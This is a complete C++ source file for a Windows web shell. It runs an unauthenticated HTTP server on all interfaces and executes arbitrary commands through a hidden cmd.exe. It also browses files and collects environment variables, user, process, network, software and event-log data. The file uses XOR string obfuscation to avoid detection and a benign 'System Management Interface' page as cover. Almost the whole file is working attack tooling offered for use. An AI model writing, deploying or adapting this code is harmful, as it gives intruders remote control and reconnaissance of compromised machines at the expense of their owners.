#pragma once
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <vector>
#include <map>
#include <iostream>
#include <fstream>
#include <sstream>
#include <thread>
#include <mutex>
#include <random>
#include <filesystem>
#include <chrono>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")

namespace StandaloneObfuscation {
    constexpr char XOR_KEY = 0x42;
    
    template<int N>
    struct ObfuscatedString {
        char data[N + 1];
        constexpr ObfuscatedString(const char* str) : data{} {
            for (int i = 0; i < N; ++i) {
                data[i] = str[i] ^ XOR_KEY;
            }
            data[N] = '\0';
        }
        
        std::string decrypt() const {
            std::string result;
            for (int i = 0; i < N; ++i) {
                result += (data[i] ^ XOR_KEY);
            }
            return result;
        }
    };
    
    template<int N>
    constexpr auto makeObfuscatedString(const char (&str)[N]) {
        return ObfuscatedString<N - 1>(str);
    }
    
    std::string htmlEncode(const std::string& input) {
        std::string result;
        for (char c : input) {
            switch (c) {
                case '<': result += "&lt;"; break;
                case '>': result += "&gt;"; break;
                case '&': result += "&amp;"; break;
                case '"': result += "&quot;"; break;
                case '\'': result += "&#39;"; break;
                default: result += c; break;
            }
        }
        return result;
    }
    
    std::string urlDecode(const std::string& input) {
        std::string result;
        for (size_t i = 0; i < input.length(); ++i) {
            if (input[i] == '%' && i + 2 < input.length()) {
                int value = std::stoi(input.substr(i + 1, 2), nullptr, 16);
                result += static_cast<char>(value);
                i += 2;
            } else if (input[i] == '+') {
                result += ' ';
            } else {
                result += input[i];
            }
        }
        return result;
    }
}

#define SOBF(str) StandaloneObfuscation::makeObfuscatedString(str).decrypt()

class StandaloneCppWebShell {
private:
    SOCKET serverSocket;
    int port;
    bool isRunning;
    std::thread serverThread;
    std::mutex logMutex;
    std::string currentDirectory;
    std::map<std::string, std::string> sessions;
    
    // HTTP response templates
    std::string getHTMLTemplate() {
        return R"(
<!DOCTYPE html>
<html>
<head>
    <title>System Management Interface</title>
    <style>
        body { font-family: monospace; background: #1a1a1a; color: #00ff00; margin: 0; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { text-align: center; border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 20px; }
        .section { margin: 20px 0; padding: 15px; border: 1px solid #333; background: #2a2a2a; }
        input, textarea, select { background: #333; color: #00ff00; border: 1px solid #555; padding: 5px; width: 100%; }
        button { background: #444; color: #00ff00; border: 1px solid #00ff00; padding: 10px 20px; cursor: pointer; }
        button:hover { background: #00ff00; color: #000; }
        .output { background: #000; border: 1px solid #333; padding: 10px; white-space: pre-wrap; font-family: monospace; }
        .file-list { max-height: 400px; overflow-y: auto; }
        .file-item { padding: 5px; border-bottom: 1px solid #333; cursor: pointer; }
        .file-item:hover { background: #444; }
        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        #command-output { height: 300px; overflow-y: auto; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🖥️ System Management Interface</h1>
            <p>Current Directory: <span id="current-dir">)" + currentDirectory + R"(</span></p>
        </div>
        
        <div class="section">
            <h3>📂 File Manager</h3>
            <div style="margin-bottom: 10px;">
                <input type="text" id="new-dir" placeholder="Enter directory path...">
                <button onclick="changeDirectory()">Change Directory</button>
                <button onclick="listFiles()">Refresh</button>
            </div>
            <div id="file-list" class="file-list"></div>
            <div style="margin-top: 10px;">
                <input type="file" id="file-upload" style="margin-bottom: 10px;">
                <button onclick="uploadFile()">Upload File</button>
            </div>
        </div>
        
        <div class="section">
            <h3>💻 Command Execution</h3>
            <div style="margin-bottom: 10px;">
                <input type="text" id="command-input" placeholder="Enter command..." onkeypress="if(event.key==='Enter') executeCommand()">
                <button onclick="executeCommand()">Execute</button>
                <button onclick="clearOutput()">Clear</button>
            </div>
            <div id="command-output" class="output"></div>
        </div>
        
        <div class="section">
            <h3>ℹ️ System Information</h3>
            <div class="info-grid">
                <div>
                    <h4>Environment Variables</h4>
                    <div id="env-vars" class="output" style="height: 200px; overflow-y: auto;"></div>
                </div>
                <div>
                    <h4>System Details</h4>
                    <div id="sys-info" class="output" style="height: 200px; overflow-y: auto;"></div>
                </div>
            </div>
            <button onclick="getSystemInfo()">Refresh System Info</button>
        </div>
        
        <div class="section">
            <h3>🛠️ Advanced Tools</h3>
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px;">
                <button onclick="getProcessList()">Process List</button>
                <button onclick="getNetworkConnections()">Network Connections</button>
                <button onclick="getInstalledSoftware()">Installed Software</button>
                <button onclick="getEventLogs()">Event Logs</button>
            </div>
            <div id="advanced-output" class="output" style="margin-top: 10px; height: 250px; overflow-y: auto;"></div>
        </div>
    </div>

    <script>
        function makeRequest(endpoint, data = null) {
            const xhr = new XMLHttpRequest();
            xhr.open(data ? 'POST' : 'GET', endpoint, false);
            if (data) {
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.send(data);
            } else {
                xhr.send();
            }
            return xhr.responseText;
        }
        
        function executeCommand() {
            const cmd = document.getElementById('command-input').value;
            if (!cmd) return;
            
            const output = makeRequest('/exec', 'cmd=' + encodeURIComponent(cmd));
            const outputDiv = document.getElementById('command-output');
            outputDiv.innerHTML += '<span style="color: #ffff00;">$ ' + cmd + '</span>\n' + output + '\n';
            outputDiv.scrollTop = outputDiv.scrollHeight;
            document.getElementById('command-input').value = '';
        }
        
        function listFiles() {
            const files = makeRequest('/list');
            document.getElementById('file-list').innerHTML = files;
        }
        
        function changeDirectory() {
            const dir = document.getElementById('new-dir').value;
            if (!dir) return;
            
            makeRequest('/chdir', 'dir=' + encodeURIComponent(dir));
            const newDir = makeRequest('/pwd');
            document.getElementById('current-dir').textContent = newDir;
            document.getElementById('new-dir').value = '';
            listFiles();
        }
        
        function getSystemInfo() {
            const envVars = makeRequest('/env');
            const sysInfo = makeRequest('/sysinfo');
            document.getElementById('env-vars').innerHTML = envVars;
            document.getElementById('sys-info').innerHTML = sysInfo;
        }
        
        function getProcessList() {
            const processes = makeRequest('/processes');
            document.getElementById('advanced-output').innerHTML = processes;
        }
        
        function getNetworkConnections() {
            const connections = makeRequest('/netstat');
            document.getElementById('advanced-output').innerHTML = connections;
        }
        
        function getInstalledSoftware() {
            const software = makeRequest('/software');
            document.getElementById('advanced-output').innerHTML = software;
        }
        
        function getEventLogs() {
            const logs = makeRequest('/eventlogs');
            document.getElementById('advanced-output').innerHTML = logs;
        }
        
        function clearOutput() {
            document.getElementById('command-output').innerHTML = '';
        }
        
        // Initialize page
        window.onload = function() {
            listFiles();
            getSystemInfo();
        }
    </script>
</body>
</html>
        )";
    }
    
public:
    StandaloneCppWebShell(int p = 8080) : port(p), isRunning(false), serverSocket(INVALID_SOCKET) {
        currentDirectory = std::filesystem::current_path().string();
        
        // Initialize Winsock
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            throw std::runtime_error(SOBF("Failed to initialize Winsock"));
        }
    }
    
    ~StandaloneCppWebShell() {
        stop();
        WSACleanup();
    }
    
    bool start() {
        // Create socket
        serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (serverSocket == INVALID_SOCKET) {
            std::cout << SOBF("Failed to create socket\n");
            return false;
        }
        
        // Set socket options
        int opt = 1;
        setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
        
        // Bind socket
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = INADDR_ANY;
        serverAddr.sin_port = htons(port);
        
        if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            std::cout << SOBF("Failed to bind socket\n");
            closesocket(serverSocket);
            return false;
        }
        
        // Listen for connections
        if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
            std::cout << SOBF("Failed to listen on socket\n");
            closesocket(serverSocket);
            return false;
        }
        
        isRunning = true;
        serverThread = std::thread(&StandaloneCppWebShell::serverLoop, this);
        
        std::cout << SOBF("Web shell server started on port ") << port << std::endl;
        std::cout << SOBF("Access via: http://localhost:") << port << std::endl;
        
        return true;
    }
    
    void stop() {
        isRunning = false;
        if (serverSocket != INVALID_SOCKET) {
            closesocket(serverSocket);
            serverSocket = INVALID_SOCKET;
        }
        if (serverThread.joinable()) {
            serverThread.join();
        }
    }
    
private:
    void serverLoop() {
        while (isRunning) {
            sockaddr_in clientAddr;
            int clientAddrLen = sizeof(clientAddr);
            SOCKET clientSocket = accept(serverSocket, (sockaddr*)&clientAddr, &clientAddrLen);
            
            if (clientSocket == INVALID_SOCKET) {
                if (isRunning) {
                    std::cout << SOBF("Failed to accept client connection\n");
                }
                continue;
            }
            
            // Handle client in separate thread
            std::thread clientThread(&StandaloneCppWebShell::handleClient, this, clientSocket);
            clientThread.detach();
        }
    }
    
    void handleClient(SOCKET clientSocket) {
        char buffer[8192];
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        
        if (bytesReceived <= 0) {
            closesocket(clientSocket);
            return;
        }
        
        buffer[bytesReceived] = '\0';
        std::string request(buffer);
        
        // Parse HTTP request
        std::string response = processRequest(request);
        
        // Send response
        send(clientSocket, response.c_str(), response.length(), 0);
        closesocket(clientSocket);
    }
    
    std::string processRequest(const std::string& request) {
        std::istringstream iss(request);
        std::string method, path, version;
        iss >> method >> path >> version;
        
        std::string response;
        std::string content;
        
        if (path == "/") {
            content = getHTMLTemplate();
            response = createHTTPResponse(SOBF("200 OK"), SOBF("text/html"), content);
        } else if (path == "/exec") {
            content = handleCommandExecution(request);
            response = createHTTPResponse(SOBF("200 OK"), SOBF("text/plain"), content);
        } else if (path == "/list") {
            content = handleFileList();
            response = createHTTPResponse(SOBF("200 OK"), SOBF("text/html"), content);
        } else if (path == "/chdir") {
            content = handleChangeDirectory(request);
            response = createHTTPResponse(SOBF("200 OK"), SOBF("text/plain"), content);
        } else if (path == "/pwd") {
            content = currentDirectory;
            response = createHTTPResponse(SOBF("200 OK"), SOBF("text/plain"), content);
        } else if (path == "/env") {
            content = handleEnvironmentVariables();
            response = createHTTPResponse(SOBF("200 OK"), SOBF("text/html"), content);
        } else if (path == "/sysinfo") {
            content = handleSystemInfo();
            response = createHTTPResponse(SOBF("200 OK"), SOBF("text/html"), content);
        } else if (path == "/processes") {
            content = handleProcessList();
            response = createHTTPResponse(SOBF("200 OK"), SOBF("text/html"), content);
        } else if (path == "/netstat") {
            content = handleNetworkConnections();
            response = createHTTPResponse(SOBF("200 OK"), SOBF("text/html"), content);
        } else if (path == "/software") {
            content = handleInstalledSoftware();
            response = createHTTPResponse(SOBF("200 OK"), SOBF("text/html"), content);
        } else if (path == "/eventlogs") {
            content = handleEventLogs();
            response = createHTTPResponse(SOBF("200 OK"), SOBF("text/html"), content);
        } else {
            content = SOBF("404 Not Found");
            response = createHTTPResponse(SOBF("404 Not Found"), SOBF("text/plain"), content);
        }
        
        return response;
    }
    
    std::string createHTTPResponse(const std::string& status, const std::string& contentType, const std::string& content) {
        std::ostringstream oss;
        oss << "HTTP/1.1 " << status << "\r\n";
        oss << "Content-Type: " << contentType << "\r\n";
        oss << "Content-Length: " << content.length() << "\r\n";
        oss << "Connection: close\r\n";
        oss << "\r\n";
        oss << content;
        return oss.str();
    }
    
    std::string extractPostData(const std::string& request, const std::string& key) {
        size_t pos = request.find("\r\n\r\n");
        if (pos == std::string::npos) return "";
        
        std::string postData = request.substr(pos + 4);
        std::string searchKey = key + "=";
        pos = postData.find(searchKey);
        if (pos == std::string::npos) return "";
        
        pos += searchKey.length();
        size_t endPos = postData.find("&", pos);
        if (endPos == std::string::npos) endPos = postData.length();
        
        return StandaloneObfuscation::urlDecode(postData.substr(pos, endPos - pos));
    }
    
    std::string executeCommand(const std::string& command) {
        HANDLE hPipeRead, hPipeWrite;
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.bInheritHandle = TRUE;
        sa.lpSecurityDescriptor = NULL;
        
        if (!CreatePipe(&hPipeRead, &hPipeWrite, &sa, 0)) {
            return SOBF("Error creating pipe");
        }
        
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.hStdOutput = hPipeWrite;
        si.hStdError = hPipeWrite;
        si.dwFlags |= STARTF_USESTDHANDLES;
        
        std::string cmdLine = SOBF("cmd.exe /c ") + command;
        
        std::string result;
        if (CreateProcessA(NULL, const_cast<char*>(cmdLine.c_str()), NULL, NULL, TRUE, 
                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(hPipeWrite);
            
            char buffer[4096];
            DWORD bytesRead;
            while (ReadFile(hPipeRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
                result.append(buffer, bytesRead);
            }
            
            CloseHandle(hPipeRead);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            CloseHandle(hPipeRead);
            CloseHandle(hPipeWrite);
            result = SOBF("Failed to execute command");
        }
        
        return result;
    }
    
    std::string handleCommandExecution(const std::string& request) {
        std::string command = extractPostData(request, SOBF("cmd"));
        if (command.empty()) return SOBF("No command specified");
        
        return StandaloneObfuscation::htmlEncode(executeCommand(command));
    }
    
    std::string handleFileList() {
        std::string html;
        try {
            for (const auto& entry : std::filesystem::directory_iterator(currentDirectory)) {
                std::string name = entry.path().filename().string();
                std::string type = entry.is_directory() ? SOBF("📁 DIR") : SOBF("📄 FILE");
                html += SOBF("<div class='file-item'>") + type + SOBF(" ") + 
                       StandaloneObfuscation::htmlEncode(name) + SOBF("</div>");
            }
        } catch (const std::exception& e) {
            html = SOBF("<div class='file-item'>Error: ") + e.what() + SOBF("</div>");
        }
        return html;
    }
    
    std::string handleChangeDirectory(const std::string& request) {
        std::string newDir = extractPostData(request, SOBF("dir"));
        if (newDir.empty()) return SOBF("No directory specified");
        
        try {
            std::filesystem::current_path(newDir);
            currentDirectory = std::filesystem::current_path().string();
            return SOBF("Directory changed successfully");
        } catch (const std::exception& e) {
            return std::string(SOBF("Error: ")) + e.what();
        }
    }
    
    std::string handleEnvironmentVariables() {
        std::string html;
        char* env = GetEnvironmentStringsA();
        if (env) {
            char* ptr = env;
            while (*ptr) {
                std::string var(ptr);
                if (!var.empty()) {
                    html += StandaloneObfuscation::htmlEncode(var) + SOBF("<br>");
                }
                ptr += var.length() + 1;
            }
            FreeEnvironmentStringsA(env);
        }
        return html;
    }
    
    std::string handleSystemInfo() {
        std::ostringstream oss;
        
        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computerName);
        if (GetComputerNameA(computerName, &size)) {
            oss << SOBF("Computer: ") << computerName << SOBF("<br>");
        }
        
        char userName[UNLEN + 1];
        size = sizeof(userName);
        if (GetUserNameA(userName, &size)) {
            oss << SOBF("User: ") << userName << SOBF("<br>");
        }
        
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        oss << SOBF("Processors: ") << sysInfo.dwNumberOfProcessors << SOBF("<br>");
        
        MEMORYSTATUSEX memInfo;
        memInfo.dwLength = sizeof(MEMORYSTATUSEX);
        if (GlobalMemoryStatusEx(&memInfo)) {
            oss << SOBF("Total RAM: ") << (memInfo.ullTotalPhys / (1024 * 1024)) << SOBF(" MB<br>");
            oss << SOBF("Available RAM: ") << (memInfo.ullAvailPhys / (1024 * 1024)) << SOBF(" MB<br>");
        }
        
        return oss.str();
    }
    
    std::string handleProcessList() {
        return StandaloneObfuscation::htmlEncode(executeCommand(SOBF("tasklist /fo csv")));
    }
    
    std::string handleNetworkConnections() {
        return StandaloneObfuscation::htmlEncode(executeCommand(SOBF("netstat -an")));
    }
    
    std::string handleInstalledSoftware() {
        return StandaloneObfuscation::htmlEncode(executeCommand(SOBF("wmic product get name,version /format:csv")));
    }
    
    std::string handleEventLogs() {
        return StandaloneObfuscation::htmlEncode(executeCommand(SOBF("wevtutil qe System /c:50 /f:text")));
    }
};

// Main application
int main() {
    std::cout << SOBF("=== Standalone C++ Web Shell ===\n");
    std::cout << SOBF("Converting PHP web shell functionality to native C++\n");
    std::cout << SOBF("No hosting required - runs its own HTTP server\n\n");
    
    try {
        StandaloneCppWebShell webshell(8080);
        
        if (webshell.start()) {
            std::cout << SOBF("Press Enter to stop the server...\n");
            std::cin.get();
            webshell.stop();
        } else {
            std::cout << SOBF("Failed to start web shell server\n");
            return 1;
        }
    } catch (const std::exception& e) {
        std::cout << SOBF("Error: ") << e.what() << std::endl;
        return 1;
    }
    
    std::cout << SOBF("Web shell server stopped.\n");
    return 0;
}